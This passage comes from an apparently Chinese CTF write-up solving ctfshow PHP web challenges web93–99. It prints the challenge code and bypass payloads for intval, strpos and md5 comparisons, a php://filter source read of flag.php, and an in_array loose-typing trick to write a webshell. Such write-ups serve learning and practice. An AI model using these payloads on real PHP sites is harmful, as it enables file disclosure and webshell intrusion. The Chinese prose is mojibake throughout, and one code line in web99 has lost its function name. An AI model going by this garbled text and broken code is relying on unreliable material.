</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="k">echo</span> <span class="nx">intval</span><span class="p">(</span><span class="nv">$num</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><pre tabindex="0"><code>preg_match(&#34;/[a-z]/i&#34;, $num)
</code></pre><p>ç›¸æ¯”ä¸Šä¸€é¢˜è¿™é¢˜å¢åŠ äº†ä¸€ä¸ªå­—æ¯çš„åŒ¹é…ï¼Œè®©æˆ‘ä»¬ä¸èƒ½ç”¨ä¸Šä¸€é¢˜eç»•è¿‡çš„æ–¹æ³•å’Œåå…­è¿›åˆ¶ç»•è¿‡çš„æ–¹æ³•</p>
<p>ä½†æ˜¯å…«è¿›åˆ¶ç»•è¿‡ä¾æ—§æ˜¯å¯è¡Œçš„ï¼Œå› ä¸ºä»–ä¸åŒ…å«å­—æ¯</p>
<p>payload:</p>
<pre tabindex="0"><code>num=010574
</code></pre><h4 id="web94">web94<a hidden class="anchor" aria-hidden="true" href="#web94">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-18 16:46:19
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$num</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$num</span><span class="o">===</span><span class="s2">&#34;4476&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;no no no!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/[a-z]/i&#34;</span><span class="p">,</span> <span class="nv">$num</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;no no no!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$num</span><span class="p">,</span> <span class="s2">&#34;0&#34;</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;no no no!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">intval</span><span class="p">(</span><span class="nv">$num</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span><span class="o">===</span><span class="mi">4476</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><pre tabindex="0"><code>!strpos($num, &#34;0&#34;)
</code></pre><p>è¿™é¢˜å¢åŠ äº†ä¸€ä¸ªæ¡ä»¶ï¼ŒåŒæ—¶åˆ¤æ–­ä¹Ÿå˜æˆäº†å¼ºåˆ¤å®šï¼Œè¿™é‡Œçš„<code>strpos()</code>å‡½æ•°ç”¨äºæŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­é¦–æ¬¡å‡ºç°çš„ä½ç½®ã€‚</p>
<p>ä¹Ÿå°±æ˜¯è¿™é‡Œæˆ‘ä»¬éœ€è¦è®©é¦–ä½ä¸ç­‰äº0æ‰èƒ½ä½¿è¿™ä¸ªåˆ¤æ–­ä¸ºfalse</p>
<h5 id="stropså‡½æ•°ç»•è¿‡">stropså‡½æ•°ç»•è¿‡ï¼š<a hidden class="anchor" aria-hidden="true" href="#stropså‡½æ•°ç»•è¿‡">#</a></h5>
<blockquote>
<p>å¯¹äºstrpos()å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ¢è¡Œè¿›è¡Œç»•è¿‡ï¼ˆ%0aï¼‰
payload:?num=%0a010574
ä¹Ÿå¯ä»¥å°æ•°ç‚¹ç»•è¿‡
payloadï¼š?num=4476.0
å› ä¸ºintval()å‡½æ•°åªè¯»å–æ•´æ•°éƒ¨åˆ†
è¿˜å¯ä»¥å…«è¿›åˆ¶ç»•è¿‡(%20æ˜¯ç©ºæ ¼çš„urlç¼–ç å½¢å¼)
payloadï¼š?num=%20010574
?num= 010574 // å‰é¢åŠ ä¸ªç©ºæ ¼
?num=+010574
?num=+4476.0</p></blockquote>
<p>æˆ‘ä»¬é€‰ç”¨å…¶ä¸­ä¸€ä¸ªç»•è¿‡æ–¹æ³•å³å¯</p>
<p>å¦‚ç©ºæ ¼ç»•è¿‡</p>
<pre tabindex="0"><code>?num=%20010574
</code></pre><p>è¿™é¢˜å› ä¸ºç”¨çš„æ˜¯å¼ºåˆ¤å®šä¹Ÿå¯ä»¥ç”¨è¿™ç§æ–¹æ³•</p>
<pre tabindex="0"><code>?num=4476.0
</code></pre><p>è¿™ç§æ–¹æ³•å°±æ˜¯ä½¿å…¶å˜ä¸ºæµ®ç‚¹å‹ä»è€Œä½¿å¼ºåˆ¤å®šä¸ºfalseï¼Œç»•è¿‡ç¬¬ä¸€ä¸ªåˆ¤å®š</p>
<h4 id="web95">web95<a hidden class="anchor" aria-hidden="true" href="#web95">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-18 16:53:59
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$num</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$num</span><span class="o">==</span><span class="mi">4476</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;no no no!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/[a-z]|\./i&#34;</span><span class="p">,</span> <span class="nv">$num</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;no no no!!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$num</span><span class="p">,</span> <span class="s2">&#34;0&#34;</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;no no no!!!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">intval</span><span class="p">(</span><span class="nv">$num</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span><span class="o">===</span><span class="mi">4476</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿™é¢˜å’Œä¸Šä¸€é¢˜çš„åŒºåˆ«å°±æ˜¯æ”¹ä¸ºäº†å¼±åˆ¤å®š</p>
<p>æ‰€ä»¥ä¸Šä¸€é¢˜çš„æ–¹æ³•äºŒå°±ç”¨ä¸äº†äº†ï¼Œæˆ‘ä»¬ç”¨æ–¹æ³•ä¸€å³å¯</p>
<p>payload:</p>
<pre tabindex="0"><code>?num=%20010574
</code></pre><h4 id="web96">web96<a hidden class="anchor" aria-hidden="true" href="#web96">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-18 19:21:24
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;u&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;u&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;flag.php&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;no no no&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="nx">highlight_file</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;u&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">
</span></span><span class="line"><span class="ln">23</span><span class="cl">
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>æˆ‘ä»¬çŸ¥é“./æŒ‡çš„çš„æ˜¯å½“å‰ç›®å½•ï¼Œæ‰€ä»¥ç›´æ¥ç”¨./ç»•è¿‡å³å¯ï¼Œä¸å½±å“æ–‡ä»¶è¯»å–</p>
<p>payload:</p>
<pre tabindex="0"><code>?u=./flag.php
</code></pre><p>or</p>
<pre tabindex="0"><code>u=/var/www/html/flag.php
?u=php://filter/read=convert.base64-encode/resource=flag.php
</code></pre><h4 id="web97">web97<a hidden class="anchor" aria-hidden="true" href="#web97">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-18 19:36:32
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span> <span class="k">and</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;b&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;b&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span> <span class="o">===</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;b&#39;</span><span class="p">]))</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="k">else</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="k">print</span> <span class="s1">&#39;Wrong.&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>è¿™æ˜¯ä¸€é“md5å¼ºæ¯”è¾ƒçš„é¢˜ç›®ï¼Œç»•è¿‡å§¿åŠ¿æŒºå¤š</p>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ç®€å•çš„æ•°ç»„ç»•è¿‡</p>
<pre tabindex="0"><code>a[]=1&amp;b[]=2
</code></pre><p>è™½ç„¶ä¼šæŠ¥é”™ä½†æ˜¯èƒ½æ‹¿åˆ°flag</p>
<p><img alt="image-20241130204752518" loading="lazy" src="assets/image-20241130204752518.png"></p>
<h4 id="web98">web98<a hidden class="anchor" aria-hidden="true" href="#web98">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-18 21:39:27
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nv">$_GET</span><span class="o">?</span><span class="nv">$_GET</span><span class="o">=&amp;</span><span class="nv">$_POST</span><span class="o">:</span><span class="s1">&#39;flag&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;flag&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;flag&#39;</span><span class="o">?</span><span class="nv">$_GET</span><span class="o">=&amp;</span><span class="nv">$_COOKIE</span><span class="o">:</span><span class="s1">&#39;flag&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;flag&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;flag&#39;</span><span class="o">?</span><span class="nv">$_GET</span><span class="o">=&amp;</span><span class="nv">$_SERVER</span><span class="o">:</span><span class="s1">&#39;flag&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;HTTP_FLAG&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;flag&#39;</span><span class="o">?</span><span class="nv">$flag</span><span class="o">:</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><blockquote>
<p><a href="https://blog.csdn.net/bys617120/article/details/135314637">CTFSHOW webå…¥é—¨åˆ·é¢˜ web98-112_ctfshow web98-CSDNåšå®¢</a></p>
<p>è¿™é“é¢˜ç”¨åˆ°äº†ä¸‰å…ƒè¿ç®—ç¬¦</p>
<p>é¦–å…ˆåˆ¤æ–­æ˜¯å¦GETä¼ å…¥äº†æ•°æ®ï¼Œå¦‚æœä¼ å…¥äº†åˆ™å°†POSTçš„åœ°å€èµ‹å€¼ç»™äº†GET</p>
<p>å…¶å®å°±æ˜¯ç”¨POSTæ›¿æ¢GET</p>
<p>å¦‚æœGETå­˜åœ¨flagå­—æ®µçš„å€¼åˆ™ä¼šç»§ç»­æ›¿æ¢ï¼Œæœ€åæ›¿æ¢æˆSERVER</p>
<p>è¿™é‡Œæˆ‘ä»¬åªè¦GETéšä¾¿ä¼ å…¥ä¸€ä¸ªæ•°æ®è®©postæ›¿æ¢get</p>
<p>ç„¶åpostä¼ å…¥ HTTP_FLAG=flag</p>
<p>è¿™æ ·æœ€åhighlight_fileå°±èƒ½å»æ˜¾ç¤º$flag</p></blockquote>
<p>è¿™é“é¢˜ä¸€å¼€å§‹æ²¡çœ‹æ‡‚ä»£ç ï¼Œçœ‹äº†ä¸Šé¢å¤§ä½¬çš„è§£é‡Šæ„Ÿè§‰å…¶å®ä¹Ÿä¸éš¾</p>
<p><img alt="image-20241201230323939" loading="lazy" src="assets/image-20241201230323939.png"></p>
<h4 id="web99">web99<a hidden class="anchor" aria-hidden="true" href="#web99">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-18 22:36:12
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nv">$allow</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">36</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mh">0x36d</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nx">array_push</span><span class="p">(</span><span class="nv">$allow</span><span class="p">,</span> <span class="nx">rand</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nv">$i</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;n&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">in_array</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;n&#39;</span><span class="p">],</span> <span class="nv">$allow</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;n&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>è¿™é“é¢˜é¦–å…ˆæ˜¯åˆ›å»ºäº†ä¸€ä¸ªæ•°ç»„ï¼Œç„¶åé€šè¿‡å¾ªç¯å†™å…¥æ•°å­—ï¼ˆèŒƒå›´0~0x36dï¼‰</p>
<p><img alt="image-20241202141710538" loading="lazy" src="assets/image-20241202141710538.png"></p>
<p>æ¥ç€å¯¹ä¼ å…¥çš„nè¿›è¡Œåˆ¤æ–­ï¼Œåˆ¤æ–­å…¶æ˜¯å¦åœ¨æ•°ç»„ä¸­ï¼Œè‹¥å­˜åœ¨åˆ™ä»¥nä¸ºåå­—åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¹¶å†™å…¥contentçš„å†…å®¹</p>
<p>æˆ‘ä»¬éœ€è¦çŸ¥é“çš„æ˜¯ï¼š</p>
<blockquote>
<p>åœ¨å¼±ç±»å‹ä¸­å½“phpå­—ç¬¦ä¸²å’Œintæ¯”è¾ƒæ—¶,å­—ç¬¦ä¸²ä¼šè¢«è½¬æ¢æˆintï¼Œæ‰€ä»¥ å­—ç¬¦ä¸²ä¸­æ•°å­—åé¢çš„å­—ç¬¦ä¸²ä¼šè¢«å¿½ç•¥ã€‚é¢˜ç›®ä¸­çš„in_arrayæ²¡æœ‰è®¾ç½®type,æˆ‘ä»¬å¯ä»¥è¾“å…¥å­—ç¬¦ä¸²5.php(æ­¤å¤„æ•°å­—éšæ„ï¼Œåªè¦åœ¨rand(1,0x36d)ä¹‹é—´å³å¯),è½¬æ¢ä¹‹åä¹Ÿå°±æ˜¯5,æ˜æ˜¾æ˜¯åœ¨é¢˜ç›®ä¸­ç”Ÿæˆçš„æ•°ç»„ä¸­çš„</p></blockquote>
<p>æ‰€ä»¥æˆ‘ä»¬é€šè¿‡ä¼ å…¥contentå†™é©¬åï¼Œé€šè¿‡èšå‰‘è¿æ¥æˆ–è€…ç›´æ¥å‘½ä»¤æ‰§è¡Œå³å¯å¾—åˆ°flag</p>
<p><img alt="image-20241202141941439" loading="lazy" src="assets/image-20241202141941439.png"></p>
<h4 id="web100">web100<a hidden class="anchor" aria-hidden="true" href="#web100">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm">\# -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm">\# @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm">\# @Date:  2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm">\# @Last Modified by:  h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm">\# @Last Modified time: 2020-09-21 22:10:28
